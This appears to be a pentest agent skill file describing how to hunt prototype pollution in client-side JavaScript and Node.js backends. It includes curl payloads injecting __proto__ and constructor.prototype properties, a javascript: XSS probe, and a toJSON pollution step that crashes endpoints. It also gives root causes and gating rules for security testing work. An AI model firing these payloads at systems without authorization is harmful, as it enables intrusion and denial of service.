---
name: hunt-prototype-pollution
description: >
  Hunt for JavaScript prototype pollution: client-side pollution via
  __proto__/constructor.prototype in URL params or merge/clone utilities,
  and server-side pollution (Node.js) via unsafe object-merge/extend
  operations on user-controlled JSON, escalating to DoS, property
  injection, or RCE via gadget chains. Use when the stack is
  JavaScript/Node-based, or client-side JS uses deep-merge/clone/extend
  utilities on URL or form data. Keywords: prototype pollution, __proto__,
  constructor.prototype, lodash merge, jQuery extend, Node.js RCE gadget.
  Do NOT use for mass assignment against ORM models (different mechanism,
  same "extra keys" smell) — use hunt-mass-assignment.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-1321]
  mitre_attack: [T1190]
  tools: [burpsuite, "server-side-prototype-pollution scanner", node, curl]
depends_on: [active-recon, web-crawling]
feeds_into: [chain-analysis]
chains_with: [hunt-mass-assignment, hunt-api-abuse, hunt-business-logic]
---

## Signals

- Client-side JS bundle imports `lodash` (`merge`, `defaultsDeep`, `set`), `jQuery.extend`, `$.extend(true, ...)`, or a hand-rolled recursive merge/clone function.
- URL query/fragment parameters parsed into an options object that's then merged with app defaults (common in client-side routers/config parsers).
- Node.js backend (`Server: Express`/`X-Powered-By: Express`, or JSON API returning Node stack traces) accepting deeply nested JSON bodies that get merged into config/session/user objects.
- Libraries with known historical prototype-pollution CVEs in use at an old version: `lodash` < 4.17.21, `jquery` < 3.4.0, `minimist` < 1.2.6, `qs` with certain configs, `hoek`, `deep-extend` — check `package.json`/bundled version strings if exposed.

## Prerequisites

- For client-side: browser DevTools console access on the target origin.
- For server-side: ability to send arbitrary nested JSON bodies and observe either direct output reflecting polluted state, or indirect effects (error messages, timing, behavior change) since server-side pollution is usually blind.

## Methodology

1. **Client-side detection — manual console probe.** On any page, before sending payloads, check if the prototype is already polluted by benign app behavior, then test an injection point (URL param parsed into an options object):
   ```js
   // in browser devtools console, on the target origin
   console.log(Object.prototype.polluted);  // should be undefined initially
   ```
   Try common client-side injection vectors via URL:
   ```bash
   curl -s "https://target.com/?__proto__[polluted]=1"
   curl -s "https://target.com/?__proto__.polluted=1"
   curl -s "https://target.com/#__proto__[polluted]=1"
   ```
   Then reload the page in a real browser and check in console:
   ```js
   console.log(Object.prototype.polluted);  // "1" if polluted
   ```

2. **Client-side impact — DOM XSS via polluted sink.** If pollution is confirmed, check whether any app-wide default (e.g. a template-rendering option, `innerHTML` sink config, a "trusted" flag) reads from a prototype-inherited property that you can now control:
   ```bash
   curl -s "https://target.com/?__proto__[transform_url]=javascript:alert(document.domain)"
   ```
   This step is target-specific — requires reading the actual bundle to find a real gadget (a property read via `obj.someFlag` where `obj` doesn't own that property), not guessing blindly.

3. **Server-side detection — timing/error-based (blind).** Send a JSON body attempting to pollute `Object.prototype` through a nested merge, then probe for side effects on a **separate, unrelated** request:
   ```bash
   curl -s -i -X POST "https://target.com/api/profile" -H "Content-Type: application/json" \
     -d '{"__proto__": {"polluted": "yes"}}'
   # or via constructor chain, bypassing naive __proto__ key filters
   curl -s -i -X POST "https://target.com/api/profile" -H "Content-Type: application/json" \
     -d '{"constructor": {"prototype": {"polluted": "yes"}}}'
   ```
   Follow up with an unrelated, simple request to see if global behavior changed (e.g. if you polluted a property that affects content-type handling, JSON parsing, or templating):
   ```bash
   curl -s -i "https://target.com/api/health"
   ```

4. **Server-side — crash/DoS confirmation (safe, strong signal).** A very reliable low-risk confirmation technique is polluting a property with a type that breaks a later `JSON.stringify`/array operation app-wide, causing a 500 on a subsequent unrelated request:
   ```bash
   curl -s -i -X POST "https://target.com/api/profile" -H "Content-Type: application/json" \
     -d '{"__proto__": {"toJSON": "polluted"}}'
   curl -s -i "https://target.com/api/health"   # expect 500 if pollution propagated
   ```
   A 500 appearing on a previously-200 unrelated endpoint, immediately after the pollution attempt and not before, is strong server-side evidence.

5. **Gadget hunting for RCE (Node-specific, deep).** If the app uses `child_process`, template engines (`ejs`, `pug`, `handlebars`), or certain ORMs, known gadget chains exist where a polluted property (e.g. a template engine's `outputFunctionName` or a Node `NODE_OPTIONS`-style escalation in some deployment configs) can be weaponized to RCE. This requires source/dependency visibility — identify the exact library+version in use and cross-reference public gadget-chain writeups for that specific library before attempting, rather than guessing generically. Any RCE attempt is destructive and requires an operator gate per project rules.

6. **Scanner-assisted sweep** across many endpoints once a manual positive is found, to scope how many sinks are affected:
   ```bash
   node server-side-prototype-pollution/ppmap.js -u https://target.com/api/profile -X POST \
     -b '{"username":"test"}' -p '{json-body}'
   ```
   (Use whichever maintained PP scanner is available in the environment; verify its `--help` output first per project CLAUDE.md before trusting flags.)

## Tooling

- Browser DevTools console for client-side confirmation (`Object.prototype`).
- `curl` for raw JSON body crafting against API endpoints.
- Known server-side prototype pollution scanners (e.g. community `ppmap`/`server-side-prototype-pollution` tooling) for sweeping multiple endpoints after manual confirmation.
- Dependency version fingerprinting (`package-lock.json` if leaked, `X-Powered-By`, bundled source maps) to match against known-CVE library versions.

## Root Causes

- Recursive merge/clone/set utility (`lodash.merge`, `jQuery.extend(true, ...)`, hand-rolled deep merge) does not block `__proto__`, `constructor`, and `prototype` as key names before assigning into the target object.
- Server-side code merges user-supplied JSON directly into a long-lived object (config, template locals, session defaults) that affects later, unrelated requests — polluting the shared `Object.prototype` rather than a request-scoped object.
- Outdated vulnerable versions of common merge/query-parsing libraries still in use.

## Validation Gate (minimum proof)

- Client-side: console output showing `Object.prototype.<key>` set to an attacker-chosen value purely from a URL/query parameter, plus (for a real finding, not just a PoC) a concrete gadget showing it affects app behavior (DOM XSS, auth bypass flag, etc.) — pollution alone without a gadget is Inferred/low severity.
- Server-side: request/response pair showing a **separate, subsequent, unrelated request** behaving differently (error, data leak, behavior change) only after the pollution payload was sent — the before/after pairing across two distinct requests is the core proof.
- For any RCE claim: an actual command execution proof equivalent to other RCE skills (e.g. `curl` output of a benign command), gated by operator approval before invocation.

## Gotchas

- **Minimum proof:** successfully setting `Object.prototype.polluted = "1"` with no observable downstream effect is Inferred, not Demonstrated — you need a gadget.
- **Common N/A:** app uses `Object.create(null)` or `Map` instead of plain objects for merge targets, or a merge library patched to block `__proto__`/`constructor`/`prototype` keys (lodash ≥4.17.21+ with the fix) — verify the exact version before concluding, don't assume from "it's lodash so it's probably fine" either way.
- **Overclaim trap:** finding a *client-side* pollution with no exploitable gadget is low/informational — don't inflate it to "RCE" just because prototype pollution *can* lead to RCE on Node elsewhere; you must show the actual gadget for this target.
- Server-side pollution is almost always blind — resist the temptation to assume success from a lack of error; actively probe a second request for the behavior change.
- Respect the project's human-gate rule before attempting any RCE gadget chain — pollution-to-RCE is exploitation, not hunting.

## Chains & Compositions

- Client-side pollution of a security-relevant default (e.g. a "trusted domains" list read via prototype fallback) → DOM XSS/SSRF, chain into whatever client-side injection class applies.
- Server-side pollution of an auth/role default property → privilege escalation, chain with hunt-broken-access-control.
- Server-side pollution reaching a template engine gadget → RCE, the most severe outcome, requires operator gate.
- Pollution via a JSON body merge that resembles mass assignment surface → cross-reference hunt-mass-assignment when the same endpoint is vulnerable to both.
